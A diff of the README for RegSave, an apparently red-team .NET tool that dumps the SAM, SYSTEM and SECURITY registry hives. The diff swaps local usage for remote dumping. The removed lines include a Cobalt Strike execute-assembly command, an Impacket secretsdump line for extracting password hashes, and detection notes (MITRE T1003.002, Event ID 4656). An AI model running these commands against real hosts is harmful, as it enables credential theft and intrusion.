@@ -1,24 +1,19 @@
 # RegSave
 
-A .NET 3.5 application that will dump SAM / SYSTEM / SECURITY registry keys to a path of your choosing.
+A .NET application that will dump SAM, SYSTEM, SECURITY registry keys from a remote host to a remote path of your choosing.
 
-## Usage
-
-```
-regsave.exe c:\Users\USER\Appdata\Local
-execute-assembly /opt/CS/toolkit/regsave.exe c:\Users\USER\Appdata\Local
-```
-Collect the files and then parse them with [Impacket secretsdump](https://github.com/SecureAuthCorp/impacket)
+## Help
 
 ```
-secretsdump.py -sam samantha.txt -security secundum.txt -system systemless.txt LOCAL
+C:\>RegSave.exe --help
+
+  -t, --Target        Required. Remote machine name
+  -o, --OutputPath    Required. Registry hives output directory path
+  --backup            (Default: false) Use REG_OPTION_BACKUP_RESTORE flag for RegOpenKeyEx
+  --acl               (Default: false) Show ACL for registry key SYSTEM\ControlSet001\Control\SecurePipeServers\winreg
+  --help              Display this help screen.
 ```
 
+## Demo
 
-## Detection
-[MITRE 1003.002](https://attack.mitre.org/techniques/T1003/002/)
-
-Look for Event ID 4656 after configuring audit policy. 
-
-More info at 
-[Detecting Attempts to steal passwords from the registry](https://medium.com/threatpunter/detecting-attempts-to-steal-passwords-from-the-registry-7512674487f8)
+![/assets/demo.png](demo.png)
